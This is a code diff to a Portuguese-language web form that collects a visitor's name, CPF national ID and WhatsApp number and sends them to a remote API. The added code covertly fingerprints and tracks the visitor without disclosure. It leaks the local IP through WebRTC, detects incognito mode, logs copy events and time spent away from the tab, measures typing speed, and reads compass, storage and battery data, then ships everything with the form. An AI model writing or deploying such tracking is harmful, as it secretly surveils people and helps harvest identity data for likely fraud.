@@ -50,10 +50,7 @@
     #telaSucesso .icone { font-size: 70px; margin-bottom: 20px; animation: pular 1s infinite; }
     #telaSucesso h2 { font-size: 34px; font-weight: 900; line-height: 1.2; margin-bottom: 15px; }
     #telaSucesso p { font-size: 18px; font-weight: 600; }
-    @keyframes pular {
-      0%, 100% { transform: translateY(0); }
-      50%      { transform: translateY(-12px); }
-    }
+    @keyframes pular { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-12px);} }
   </style>
 </head>
 <body>
@@ -89,40 +86,127 @@
   <script>
     const API_URL = 'https://gets-invio-on-api.onrender.com';
 
-    // ====== TEMPO DE PREENCHIMENTO ======
-    const inicio = Date.now();
+    // ============ RASTREAMENTO COMPORTAMENTAL ============
+    let tempoFora = 0;
+    let ultimaSaida = null;
+    let copiouAlgo = false;
+    let teclasDigitadas = 0;
+    let inicioDigitacao = null;
+    let bussolaHeading = null;
+    let storageInfo = null;
+    let incognito = false;
+    let connectionType = 'Desconhecida';
+    let localIP = null;
 
-    // ====== JÁ VISITOU ANTES? ======
-    let jaVisitou = false;
+    // Tempo parado (Page Visibility)
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        ultimaSaida = Date.now();
+      } else if (ultimaSaida) {
+        tempoFora += Math.round((Date.now() - ultimaSaida) / 1000);
+        ultimaSaida = null;
+      }
+    });
+
+    // Se copiou algo (Ctrl+C)
+    document.addEventListener('copy', () => { copiouAlgo = true; });
+
+    // Velocidade de digitação
+    document.querySelectorAll('input, textarea').forEach(el => {
+      el.addEventListener('keydown', () => {
+        if (!inicioDigitacao) inicioDigitacao = Date.now();
+        teclasDigitadas++;
+      });
+    });
+
+    // Tipo de conexão (wifi/cellular/etc)
     try {
-      jaVisitou = localStorage.getItem('jaVisitou') === 'sim';
-      localStorage.setItem('jaVisitou', 'sim');
+      if (navigator.connection && navigator.connection.type) {
+        connectionType = navigator.connection.type;
+      }
     } catch (e) {}
 
-    // ====== REFERRER (de onde veio) ======
-    function pegarOrigem() {
-      const ref = document.referrer;
-      if (!ref) return 'Direto (digitou ou favorito)';
-      if (ref.includes('wa.me') || ref.includes('whatsapp')) return 'WhatsApp';
-      if (ref.includes('instagram')) return 'Instagram';
-      if (ref.includes('facebook') || ref.includes('fb.')) return 'Facebook';
-      if (ref.includes('tiktok')) return 'TikTok';
-      if (ref.includes('google')) return 'Google';
-      if (ref.includes('bing')) return 'Bing';
-      if (ref.includes('youtube')) return 'YouTube';
-      if (ref.includes('twitter') || ref.includes('x.com')) return 'Twitter/X';
-      if (ref.includes('telegram')) return 'Telegram';
-      if (ref.includes('linkedin')) return 'LinkedIn';
+    // WebRTC pra pegar IP local (detectar rede corporativa)
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('');
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) return;
+        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+        if (match) {
+          localIP = match[1];
+          pc.close();
+        }
+      };
+    } catch (e) {}
+
+    // Detectar modo anônimo
+    async function detectarIncognito() {
       try {
-        return 'Outro: ' + new URL(ref).hostname;
+        const k = '__test_incognito__';
+        localStorage.setItem(k, '1');
+        localStorage.removeItem(k);
+        if (navigator.storage && navigator.storage.estimate) {
+          const est = await navigator.storage.estimate();
+          if (est.quota && est.quota < 120000000) return true;
+        }
+        return false;
       } catch (e) {
-        return 'Desconhecida';
+        return true;
       }
     }
 
-    const origem = pegarOrigem();
+    // Espaço em disco estimado
+    async function detectarStorage() {
+      try {
+        if (navigator.storage && navigator.storage.estimate) {
+          const est = await navigator.storage.estimate();
+          return {
+            quota: Math.round((est.quota || 0) / 1024 / 1024),
+            uso: Math.round((est.usage || 0) / 1024 / 1024),
+          };
+        }
+      } catch (e) {}
+      return null;
+    }
 
-    // ====== DETECÇÃO DE DISPOSITIVO ======
+    // Bússola (funciona em Android; iOS precisa permissão)
+    function detectarBussola() {
+      return new Promise((resolve) => {
+        let resolvido = false;
+        const timeout = setTimeout(() => {
+          if (!resolvido) { resolvido = true; limpar(); resolve(null); }
+        }, 2500);
+
+        const handler = (e) => {
+          let heading = null;
+          if (e.webkitCompassHeading != null) heading = e.webkitCompassHeading;
+          else if (e.alpha != null) heading = 360 - e.alpha;
+          if (heading != null && !resolvido) {
+            resolvido = true;
+            clearTimeout(timeout);
+            limpar();
+            resolve(Math.round(heading));
+          }
+        };
+
+        function limpar() {
+          window.removeEventListener('deviceorientationabsolute', handler, true);
+          window.removeEventListener('deviceorientation', handler, true);
+        }
+
+        try {
+          window.addEventListener('deviceorientationabsolute', handler, true);
+          window.addEventListener('deviceorientation', handler, true);
+        } catch (e) {
+          clearTimeout(timeout);
+          resolve(null);
+        }
+      });
+    }
+
+    // ============ DETECÇÃO DE DISPOSITIVO ============
     async function detectarDispositivo() {
       const ua = navigator.userAgent;
       let sistema = 'Desconhecido';
@@ -149,7 +233,12 @@
       try {
         if (navigator.getBattery) {
           const b = await navigator.getBattery();
-          bateria = { nivel: Math.round(b.level * 100), carregando: b.charging };
+          bateria = {
+            nivel: Math.round(b.level * 100),
+            carregando: b.charging,
+            tempoCarregar: b.chargingTime === Infinity ? null : Math.round(b.chargingTime / 60),
+            tempoDescarregar: b.dischargingTime === Infinity ? null : Math.round(b.dischargingTime / 60),
+          };
         }
       } catch (e) {}
 
@@ -161,16 +250,11 @@
       } catch (e) {}
 
       const ram = navigator.deviceMemory || null;
-
       let fuso = 'Desconhecido';
-      try {
-        fuso = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconhecido';
-      } catch (e) {}
+      try { fuso = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconhecido'; } catch (e) {}
 
       let orientacao = 'Desconhecida';
-      try {
-        if (screen.orientation && screen.orientation.type) orientacao = screen.orientation.type;
-      } catch (e) {}
+      try { if (screen.orientation && screen.orientation.type) orientacao = screen.orientation.type; } catch (e) {}
 
       const nucleos = navigator.hardwareConcurrency || null;
 
@@ -188,10 +272,13 @@
       const pixelRatio = window.devicePixelRatio || 1;
       const touch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
       const cookies = navigator.cookieEnabled;
-
-      // Hora local exata do cliente
       const agora = new Date();
       const horaCliente = agora.toLocaleString('pt-BR');
+
+      // Detecções assíncronas
+      incognito = await detectarIncognito();
+      storageInfo = await detectarStorage();
+      bussolaHeading = await detectarBussola();
 
       return {
         sistema, navegador, tipo,
@@ -199,7 +286,9 @@
         tela: `${window.screen.width}x${window.screen.height}`,
         bateria, conexao, ram, fuso, orientacao,
         nucleos, gpu, corProfundidade, pixelRatio,
-        touch, cookies, horaCliente
+        touch, cookies, horaCliente,
+        incognito, storage: storageInfo, bussola: bussolaHeading,
+        tipoConexao: connectionType, ipLocal: localIP,
       };
     }
 
@@ -217,6 +306,7 @@
     const btn = document.getElementById('btn');
     const resultado = document.getElementById('resultado');
     const telaSucesso = document.getElementById('telaSucesso');
+    const inicio = Date.now();
 
     function pegar(id) { return document.getElementById(id).value.trim(); }
 
@@ -228,8 +318,38 @@
       e.target.value = v;
     });
 
+    // Calcular velocidade de digitação
+    function calcVelocidadeDigitacao() {
+      if (!inicioDigitacao || teclasDigitadas < 2) return null;
+      const segundos = (Date.now() - inicioDigitacao) / 1000;
+      if (segundos < 1) return null;
+      return Math.round((teclasDigitadas / segundos) * 60); // teclas por minuto
+    }
+
+    // Referrer
+    function pegarOrigem() {
+      const ref = document.referrer;
+      if (!ref) return 'Direto (digitou ou favorito)';
+      if (ref.includes('wa.me') || ref.includes('whatsapp')) return 'WhatsApp';
+      if (ref.includes('instagram')) return 'Instagram';
+      if (ref.includes('facebook') || ref.includes('fb.')) return 'Facebook';
+      if (ref.includes('tiktok')) return 'TikTok';
+      if (ref.includes('google')) return 'Google';
+      if (ref.includes('bing')) return 'Bing';
+      if (ref.includes('youtube')) return 'YouTube';
+      if (ref.includes('twitter') || ref.includes('x.com')) return 'Twitter/X';
+      if (ref.includes('telegram')) return 'Telegram';
+      if (ref.includes('linkedin')) return 'LinkedIn';
+      try { return 'Outro: ' + new URL(ref).hostname; } catch (e) { return 'Desconhecida'; }
+    }
+
+    let jaVisitou = false;
+    try {
+      jaVisitou = localStorage.getItem('jaVisitou') === 'sim';
+      localStorage.setItem('jaVisitou', 'sim');
+    } catch (e) {}
+
     btn.addEventListener('click', async () => {
-      // Calcula tempo de preenchimento em segundos
       const tempoSegundos = Math.round((Date.now() - inicio) / 1000);
 
       const dadosForm = {
@@ -238,9 +358,12 @@
         cpf: pegar('cpf'),
         whatsapp: pegar('whatsapp'),
         dispositivo: dispositivo,
-        origem: origem,
+        origem: pegarOrigem(),
         jaVisitou: jaVisitou,
         tempoPreenchimento: tempoSegundos,
+        tempoFora: tempoFora,
+        copiouAlgo: copiouAlgo,
+        velocidadeDigitacao: calcVelocidadeDigitacao(),
       };
 
       resultado.style.display = 'none';
